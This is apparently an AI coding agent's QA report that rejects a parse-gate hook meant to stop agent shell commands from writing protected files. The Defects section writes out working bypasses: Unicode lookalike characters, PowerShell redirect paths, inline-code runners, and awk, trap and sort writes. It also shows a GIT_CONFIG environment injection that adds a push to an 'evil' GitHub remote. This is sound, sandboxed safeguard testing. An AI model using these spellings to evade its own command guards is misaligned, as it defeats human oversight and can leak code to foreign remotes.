# QA 241: T-194 r6 (the planner seat hook, inverted by a parse gate), scored by property

**Verdict: REJECT.** The P0 inversion holds against every spelling QA 237 found and against my own 337-case refused
generator — the five rounds of tokeniser holes are closed. But the gate's own premise ("a command is checked only if
the hook fully parses it") is **false for PowerShell**: the gate mis-tokenises several inputs it believes it parsed and
lets a write through. I confirmed **six fail-open classes in a real shell** (Windows PowerShell 5.1 and Git Bash), each
writing a protected repo file with the hook allowing it. Separately, **CI is red on Linux** — the candidate's own test
suite fails there, so r5's "CI green on Linux" property is lost.

- **QA:** 241, record session 241. Claude Code on **Opus** (`claude-opus-4-8`), headless `claude -p`, laptop
  DESKTOP-0GV3HAD (D-068).
- **Dispatch commit (working copy):** `e4a3327f2d887ae226b1619e68b9872d828ca559`
  (`git -C C:/qa-scratch/qa241-wt log -1 --format=%H`).
- **Candidate:** `9cf8c7eb427f732022c23baefa8092571d94daca` on `origin/loop/t194-planner-hook` (parent `84a2a48a`, master
  merged in). **Base for red:** `7a3a4441` (r5, REJECTED by QA 237).
- **Evidence:** `docs/loops/t194-r6-qa-report.E_t.json`; scripts and raw outputs in `docs/loops/qa-241/`. Every probe
  drives the **real built CLI** (`build/cli-planner-hook.js`) with fixture stdin. The hook is registered nowhere. No
  live GitHub merge or call: the CLI runs with no token, and async rows use a fake fetch. Real-shell truth is from
  `shell-truth-r6.mjs` / `probe-ps-redirect.mjs` (real PowerShell 5.1 from a UTF-8-BOM `.ps1`, real Git Bash `bash -c`),
  writing only under `C:/qa-scratch/qa241-*` and `C:/qa-tmp`.

## Build, suite, CI

| Step | Result |
|---|---|
| `npm ci` (open-brain/, candidate, TEMP/TMP=`C:\qa-tmp`) | **exit 0** (185 packages) |
| `npm run build` | **exit 0**, `build stamped 9cf8c7e` |
| `npx tsc --noEmit` | **exit 0** |
| `vitest run tests/planner-hook` (candidate) | **exit 0, 10 files, 813 passed** |
| the 3 r6 test files + r6-depth against the **r5 product** (`git checkout 7a3a4441 -- open-brain/src/planner-hook`, parse-gate.ts absent at r5) | **exit 1, 180 failed / 201 passed; 3 of 4 files red** (r6-depth passes: it calls r5 internals directly). Red confirmed, restored afterwards. |
| `git diff 7a3a4441 9cf8c7eb -- hook.test.ts r3.test.ts` | **empty**: the r4/r3 test files are unchanged |
| **tcm CI, candidate** `qa/t194-r6-ci-candidate` | run **36867744673**, headSha `9cf8c7eb427f732022c23baefa8092571d94daca`, run conclusion **failure**; **`test` job 110387471896 FAILURE on tcm-1, Linux x64**; `changed` job success; `test-windows` skipped. 1 of 2 tcm runs used; `windows=true` not used. |

**CI test job (Linux) is RED.** `tests/planner-hook/r6-qa237.test.ts > gen-p1` fails on **8 rows** — all
upper/mixed-case path variants (`PACKAGE.json`, `../HOOKS/H.js`, `../SCRIPTS/s.sh`, `../TESTS/T.test.ts`,
`../O'PEN-brain'/src/A.ts`), each "expected deny, got allow." The suite totals **1 file failed / 147 passed (148)**;
**1 test failed / 2756 passed / 8 skipped (2765)**. Root cause: the r6-qa237 rows are seeded from QA 237's gen-p1,
which ran on a case-insensitive Windows FS, so it tagged `PACKAGE.json` as a write to the protected `package.json`.
On Linux the FS is case-sensitive, `PACKAGE.json` ≠ `package.json`, and the hook correctly allows it — but the baked
expectation is `deny`. Whatever the cause, **the candidate's suite does not pass in CI**, and the handoff's "Nothing
ran on Linux or in CI" is now a red result, not an untested one. This must be green before merge.

## Rows to score

| Row | Status | Evidence (details under "Defects") |
|---|---|---|
| **R6-P0, the gate** | **not met** | My own generator (`gen-p0.mjs`, built from the dispatch's refused/accepted lists, not Forge's): **337 refused cases, every one `not statically parseable` with its construct named**; **170 accepted cases, every one proceeds to P1-P3** (162 allow, 8 deny), 0 wrongly gated. The property still breaks: the gate **mis-tokenises PowerShell it claims to parse** and allows a write. Six fail-open classes, all confirmed in a real shell (D-A…D-F). |
| **D8 `#N`** | **met** | `gh pr merge #7` refused by P0 (comment); quoted `'#7'` reads PR 7 (grant without a token). |
| **D9 foreign pull URL** | **met** | `gh pr merge https://github.com/other/repo/pull/3` needs a grant, nothing read (`prfiles.ts` compares owner+repo case-insensitively before any fetch). |
| **Non-merge (gh first two positional words)** | **met** | `gh pr comment 5 --body merge`, `gh pr list --label merge`, `gh pr create --title merge`, `gh pr view 5` all allowed; only `pr merge` is a merge. |
| **`git -c` risky keys** | **met** | `alias. remote. url. include. includeIf. core.` each needs a grant, any subcommand, case-insensitive, via `-c`, `--config-env=` and `--config-env <k>`; a git alias (`git st`) refused by P0. `user.name` stays allowed. |
| **Limit text, both directions** | **partly met** | The named items are present and none is caught (`gen-p0`, probes). But it omits the new fail-open families D-D/D-E (inline-code spellings, awk/sort/find/trap/mapfile), so it is not true in the "nothing out of reach is unstated" direction. |
| **QA 237 rows (D1–D17)** | **met** | Every D1–D17 fail-open is now refused by P0 or decided correctly. gen-p1 400 / gen-p2 380 / gen-p2b 316 / gen-p3 360, probe-holes(2), probe-merge-async, probe-comma, fail-closed re-run unmodified bar paths: **0 fail-open**. Changes listed below. |
| **Fail-closed cost** | **met (reviewed)** | `cost-list.txt`'s 31 rows reproduce; rewrites accepted. Extra costs noted below. |
| **Mutants** | **met** | All **105** in one sequential pass (6 back-to-back slices, same tree): **105 killed, 0 survivors, 0 typecheck failures**. My own **6 per-family mutants** (`qa-mutants.mjs`) all killed. |
| **Regression** | **mixed** | r5's met rows (non-literal, file tools, standing push, exact grant) hold; `hook.test.ts`/`r3.test.ts` unchanged; every changed earlier test follows a ruling (checked below). **But CI is red on Linux**, so r5's "CI green on Linux" row regresses. |

## Defects (each confirmed in the real shell; the hook ALLOWS, the file is written)

The P0 premise is "a command is checked only if the hook fully parses it." These break it: the gate **believes it
parsed** the command (it reaches the end of its scan with no refusal) and allows it, but it mis-tokenised the input, so
a real shell writes a protected file. `probe-r6.mjs` / `probe-ps-redirect.mjs` drive the real CLI; `shell-truth-r6.mjs`
runs each in a real shell with cwd a throwaway tree and checks whether `open-brain/src/x.ts` appeared.

- **D-A — PowerShell redirect targets skip the gate's `::` and drive-relative checks.** `gatePowerShell`'s `>`/`2>`
  branch (`parse-gate.ts:667` and `:684`) reads the target with `readTok` and pushes it **without** the provider-path
  (`if (t.text.includes("::"))`, `:698`) and drive-relative (`:699`) checks that every ordinary token gets. So all of
  these ALLOW and WRITE in real PS 5.1:
  - `Write-Output x > FileSystem::C:\…\open-brain\src\x.ts`
  - `Write-Output x > Microsoft.PowerShell.Core\FileSystem::C:\…\open-brain\src\x.ts`
  - `Write-Output x >> FileSystem::C:\…\open-brain\src\x.ts`
  - `Write-Output x > C:open-brain/src/x.ts` (drive-relative).

  The positional form `Set-Content FileSystem::… -Value x` **is** caught (the `::` check runs on normal tokens), so this
  is purely the redirect path. This is QA 237 **D15** reopened through redirects.
- **D-B — PowerShell Unicode lookalikes the gate reads as word characters.** `readTok` breaks a word only on ASCII
  space/tab/`;`/`|`/`>`/newline, and treats `-` as the only parameter dash and `'`/`"` as the only quotes. PowerShell
  5.1 also treats these as whitespace/dash/quote, so the gate glues or mis-reads the word and the write slips. All ALLOW
  and WRITE in real PS 5.1:
  - `Set-Content<U+00A0>open-brain/src/x.ts x` (NBSP) and `Set-Content<U+3000>…` (ideographic space): the gate reads one
    glued token `Set-Content<sep>path`, not a known cmdlet, so it is treated as a native command and no target is read.
  - `Set-Content <U+2013>Value x open-brain/src/x.ts` and `<U+2014>Value …` (en-/em-dash): PS normalises `–Value` to
    `-Value`; the gate, seeing a word that does not start with ASCII `-`, treats `–Value` as a positional, so the real
    path lands as a later positional and is missed. `<U+2013>EA 0 …` likewise defeats the unknown-parameter check.
  - `Set-Content <U+2018>open-brain/src/x.ts<U+2019> x` and the double-curly `<U+201C>…<U+201D>`: PS strips the smart
    quotes; the gate keeps them, so the quoted path is read with the quote characters attached and does not match.
- **D-C — `New-Item -Name <path>` with no `-Path` writes to the cwd, uncaught.** In `bash.ts` `psCommandTargets`, the
  `new` kind uses `base = pathVals.length>0 ? pathVals : pos.slice(0,1)`; with only `-Name` and `-ItemType` there are no
  positionals, so `base` is empty and the `names`-combining branch (`if (names.length>0 && base.length>0)`) is skipped —
  **no target is produced**. `New-Item -Name open-brain/src/x.ts -ItemType File` (and `-Name x.ts` from cwd
  `open-brain/src`) ALLOW and WRITE in real PS 5.1. The only test for `-Name` pairs it with `-Path`
  (`r5.test.ts:324`, `r6.test.ts:120,146`); the mutant `r5-p3-newitem-name-ignored` only pins that pair, so this is
  unpinned.
- **D-D — Bash inline-code runners in the attached / `--eval=` spellings.** The gate's `INLINE_CODE` table matches `-e`,
  `--eval`, `-c`, `-pe`… only as a **separate** word. These ALLOW, and write a protected file in real Git Bash:
  - `node --eval="require('fs').writeFileSync('open-brain/src/x.ts','x')"` (WROTE)
  - `perl -e'open(F,">open-brain/src/x.ts")'` (WROTE)

  (`node -e"…"` glued does **not** write — node rejects `-erequire…`; `python`/`ruby` are not installed on this laptop,
  so those rows are inconclusive, but the gate allows them identically.) The dispatch's own rule: inline code writing a
  protected file is "either refused, or stated in the limit text as out of reach; a silent allow is a defect." The gate
  *tries* to refuse inline code and misses these spellings, and the limit text does not state them, so it is a defect.
- **D-E — Bash code-running / file-writing commands with no allow-list.** None of these is refused by name, and each
  WROTE a protected file in real Git Bash:
  - `awk 'BEGIN{print "x" > "open-brain/src/x.ts"}'` and `awk 'BEGIN{system("echo x > open-brain/src/x.ts")}'` — the
    gate refuses only `awk -i`; the dispatch **explicitly names `awk '…system(…)…'`** as a runner to judge.
  - `trap 'echo x > open-brain/src/x.ts' EXIT` and `mapfile -C 'echo x > open-brain/src/x.ts;:' -c 1 < README.md` —
    code-running bash builtins not in `REFUSED_COMMANDS`.
  - `sort -o open-brain/src/x.ts README.md` and `find . -maxdepth 0 -fprint open-brain/src/x.ts` — ordinary commands
    that write a named file, neither read by the write-target detector nor named in the limit text.
- **D-F — git config injected through the environment reaches a foreign repo with no grant.** The gate accepts any
  leading `NAME=value` with a literal value. Real git reads `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n`
  and `GIT_CONFIG_PARAMETERS` from the environment. So
  `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/evil/x git push origin loop/x`
  (and the `GIT_CONFIG_PARAMETERS="'remote.origin.url'='https://github.com/evil/x'"` form) is **allowed as a standing
  push**, but real git then lists two push URLs for origin — the real one **and** `evil/x` (confirmed with
  `git remote get-url --push --all origin`). This is the Open-5 ruling (`git -c remote.` needs a grant) reopened through
  the environment; the refused `-c` form and the allowed env form have the same effect. Scope note: the limit text's
  "what a program does with its own arguments" does not mention the environment, and the ruling makes the `-c` form
  grant-required, so a reader would not expect the env form to be a silent allow.

## QA 237's probes and generators, re-run against the candidate (required evidence)

QA 237's scripts were copied from `origin/qa/t194-r5-report` (`1a658b39`) with only the fixture paths re-pointed
(`copy-qa237.mjs`; 0–3 changed lines/file, all path constants) and run unmodified against the candidate's built CLI.
Every D1–D17 fail-open is now refused by P0 or decided correctly — **0 fail-open across 1,456 generated cases plus the
probe scripts**:

| Script | Cases | Agree with QA's oracle | Refused by P0 (fail-closed cost) | Fail-open |
|---|---:|---:|---:|---:|
| gen-p1 | 400 | 263 | 137 (86 were allow/read-expected) | **0** |
| gen-p2 | 380 | 356 | 24 | **0** |
| gen-p2b | 316 | 288 | 26 (+2 standing pushes now grant-required by Open-5: `… -c core.x=1 push`) | **0** |
| gen-p3 | 360 | 264 | 96 | **0** |
| probe-holes / probe-holes2 | 64 / 29 | — | D1–D16 spellings all refused/decided | **0** |
| probe-merge-async | 5 | — | `#2`, foreign URL refused; origin control reads; `--repo` grant | **0** |
| probe-comma / fail-closed | 2 / 22 | — | comma lists refused; costs name a cause | **0** |

The two QA 237 survivors (`qa-p1-install-ignored`, `qa-p3-comma-list-off`) are now pinned — `r6-install-ignored` and
`r6-comma-quoted-split-off` are in the 105 and were killed.

## Mutants

Local, sequential, in `C:/qa-scratch/qa241-mut` at the candidate; each: `git apply`, `tsc --noEmit`,
`vitest run tests/planner-hook --reporter=json`, restore. One pass split into six back-to-back slices (a tool call is
capped at 10 min; ~27 s/mutant). **105 of 105 killed, 0 survivors, 0 typecheck failures** (`mutants-out.json`). Free RAM
checked first: ~2.6 GB of 8 GB.

My own **6 mutants, one per P0 refusal family** (`qa-mutants.mjs`, `qa-mutants-out.json`) — each disables one gate check;
all killed: `qa-bash-backslash` (10 failed), `qa-bash-reserved` (18), `qa-bash-wrappers` (23), `qa-bash-shell-stdin`
(13), `qa-ps-unknown-param` (11), `qa-ps-dynamic` (17). (The backslash mutant first appeared to survive — a
`String.replace` `$'` special-pattern bug in my harness, not the suite; with a function replacement it kills, 10
failed, matching Forge's identical `p0-backslash-allowed`.)

## Regression

- `hook.test.ts` and `r3.test.ts`: byte-identical to r5. The changed earlier tests follow rulings (handoff "Supersedes"):
  `docs-merge.test.ts` (foreign URL → grant, D9), `r4.test.ts` (`{}` now refused → `'{}'`), `r5.test.ts` (heredoc
  message rows replaced; `$(...)`/`loop/$BR` refused by P0), `r5-property.test.ts` (generators drop `( )`, `>|`, `& git`,
  newline, `$( )`), `r5-fixture.ts`. Each change is a construct P0 now refuses — consistent.
- r5's met rows hold under my generators: non-literal, file tools, standing push, exact grant.
- **CI green on Linux (r5 had it) regresses** — see Build/CI.

## Open for the planner

1. **The REJECT rests on D-A…D-F and the red CI.** D-A, D-B and D-C are breaks of P0's own promise for PowerShell: the
   gate must either (a) refuse any word it cannot tokenise against PowerShell's real whitespace/dash/quote set
   (NBSP, U+3000, en/em-dash, smart quotes), and (b) run the `::` / drive-relative / dot-source checks on redirect
   targets too, not only ordinary tokens; and the `New-Item -Name` path must be read when `-Path` is absent.
2. **D-D / D-E are the Bash side the dispatch asked about.** The gate already tries to refuse inline code — it just
   misses `--eval=`, attached `-e'…'`, and the whole awk/sort/find/trap/mapfile set. Either refuse these by spelling, or
   state each class in the limit text as out of reach (the dispatch says a silent allow is a defect).
3. **D-F:** does a `GIT_CONFIG_*` / `GIT_CONFIG_PARAMETERS` environment assignment count as the same act the Open-5
   ruling grant-gates for `-c remote.`/`url.`/etc.? Real git honours it and a standing push then also goes to the
   foreign URL. A leading `NAME=value` that is a git-config injection variable is not a harmless literal.
4. **CI must be green on Linux.** The r6-qa237 rows carry case-insensitive expectations (`PACKAGE.json` = protected);
   on a case-sensitive FS the hook correctly allows them and the test fails. The rows (or the oracle that seeded them)
   need to be case-aware, or marked Windows-only, so the suite passes on the one platform CI runs.
5. Nothing model-side blocked this run. 1 of the 2 tcm runs used; no `windows=true`; no live GitHub call.

QA-241: REPORT COMPLETE
